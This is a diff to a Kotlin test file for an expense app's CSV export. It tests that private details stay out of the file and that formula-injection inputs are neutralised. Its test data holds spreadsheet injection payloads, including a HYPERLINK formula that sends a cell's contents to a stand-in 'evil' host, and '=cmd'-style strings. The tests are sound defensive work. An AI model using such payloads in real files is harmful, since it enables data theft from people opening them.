@@ -343,7 +343,8 @@ class CsvExportTest {
     @Test
     fun `REQ-SEC-069 no message text sender full account number or receipt content reaches the file`() =
         runTest {
-            db.expenses().insert(entryWith(entry("a", 100, "2026-10-05T07:00:00Z", merchant = "Shop"), accountId = "acc"))
+            val shop = entryWith(entry("a", 100, "2026-10-05T07:00:00Z", merchant = "Shop"), accountId = "acc")
+            db.expenses().insert(shop.copy(instrumentLast4 = "5678"))
             db.lookups().upsertAccounts(listOf(AccountEntity("acc", "Main", "EGP", last4 = "1234")))
             db.sources().insert(ExpenseSourceEntity("s", "a", "SMS", "LOCAL-SECRET-ID", 1, "SENDER-SECRET", "1234"))
             db.reviews().insert(
@@ -352,7 +353,7 @@ class CsvExportTest {
             db.receipts().insert(ReceiptEntity("r", "a", "RECEIPT-NAME-SECRET.pdf", "application/pdf", 5, "SHA-SECRET-HASH", 1, 1))
             val raw = text(run().second)
             val secrets =
-                listOf("BODY-SECRET", "REVIEW-SENDER-SECRET", "LOCAL-SECRET-ID", "RECEIPT-NAME-SECRET", "SHA-SECRET", "1234")
+                listOf("BODY-SECRET", "REVIEW-SENDER-SECRET", "SENDER-SECRET", "LOCAL-SECRET-ID", "RECEIPT-NAME-SECRET", "5678", "1234")
             for (secret in secrets) {
                 assertFalse("leaked $secret", raw.contains(secret))
             }
@@ -436,4 +437,65 @@ class CsvExportTest {
         assertEquals("\"'-1\"", CsvFormat.text("-1"))
         assertEquals("a=b", CsvFormat.text("a=b"))
     }
+
+    private fun ch(code: Int) = code.toChar().toString()
+
+    private val invisibles =
+        listOf(" ", ch(0xA0), ch(0x200E), ch(0x200F), ch(0x200B), ch(0x200C), ch(0x200D), ch(0xFEFF), "  " + ch(0xA0))
+    private val formulaChars = listOf("=", "+", "-", "@", ch(0xFF1D), ch(0xFF0B), ch(0xFF0D), ch(0xFF20))
+
+    /** True when a spreadsheet could read this piece as a formula: after quotes and invisible characters, a formula character. */
+    private fun startsFormula(piece: String): Boolean {
+        val first = piece.dropWhile { it == '"' || it.isWhitespace() || it.code in 0x200B..0x200F || it.code == 0xFEFF }.firstOrNull()
+        return first != null && first.toString() in formulaChars
+    }
+
+    private fun assertNoCellStartsFormula(raw: String) {
+        for (piece in raw.split(';', ',', '\n', '\r', '\t')) assertFalse("a cell starts a formula: $piece", startsFormula(piece))
+    }
+
+    @Test
+    fun `REQ-SEC-069 leading spaces invisible characters and full-width signs do not hide a formula`() {
+        for (lead in invisibles + "") {
+            for (f in formulaChars) {
+                val cell = CsvFormat.text(lead + f + "1+1")
+                assertTrue("not guarded: $cell", cell.startsWith("\"'"))
+            }
+        }
+        assertEquals(" hello", CsvFormat.text(" hello"))
+        assertEquals("100-200", CsvFormat.text("100-200"))
+    }
+
+    @Test
+    fun `REQ-SEC-069 a semicolon or line break inside a field cannot start a new cell with a formula`() {
+        assertEquals("\"x;'=HYPERLINK(\"\"h\"\"&A1)\"", CsvFormat.text("x;=HYPERLINK(\"h\"&A1)"))
+        assertEquals("\"x\n'=cmd\"", CsvFormat.text("x\n=cmd"))
+        assertEquals("\"x;' =1\"", CsvFormat.text("x; =1"))
+        assertEquals("a;b", CsvFormat.text("a;b"))
+        val values = listOf("x;=1", "x\n=1", "x\r+1", "x\t@1", "x, -1", "x;" + ch(0x200B) + "=1", "x\n" + ch(0xFF1D) + "1")
+        for (value in values) assertNoCellStartsFormula(CsvFormat.text(value))
+    }
+
+    @Test
+    fun `REQ-SEC-069 split on semicolons and bare line feeds no exported cell starts with a formula character`() =
+        runTest {
+            db.lookups().upsertCategories(listOf(CategoryEntity("c", " =1+1", "x", 0)))
+            val evil = "x;=HYPERLINK(\"http://evil/?\"&A1)"
+            val base = entry("a", 100, "2026-10-05T07:00:00Z", merchant = evil, notes = "x\n=HYPERLINK(1)\n+cmd\n" + ch(0x200E) + "@x")
+            db.expenses().insert(entryWith(base, categoryId = "c"))
+            db.expenses().insert(entry("b", 100, "2026-10-06T07:00:00Z", merchant = ch(0xFF1D) + "1", notes = "a;  -2"))
+            val raw = text(run().second)
+            assertNoCellStartsFormula(raw)
+            assertEquals(3, parseCsv(raw.removePrefix(BOM)).size)
+        }
+
+    @Test
+    fun `REQ-SEC-069 the source sender and the instrument last four never reach the file`() =
+        runTest {
+            val base = entry("a", 100, "2026-10-05T07:00:00Z", merchant = "Shop")
+            db.expenses().insert(base.copy(instrumentLast4 = "5678"))
+            db.sources().insert(ExpenseSourceEntity("s", "a", "SMS", "LOCAL-ID", 1, "SENDER-SECRET", "4321"))
+            val raw = text(run().second)
+            for (secret in listOf("SENDER-SECRET", "5678", "4321", "LOCAL-ID")) assertFalse("leaked $secret", raw.contains(secret))
+        }
 }
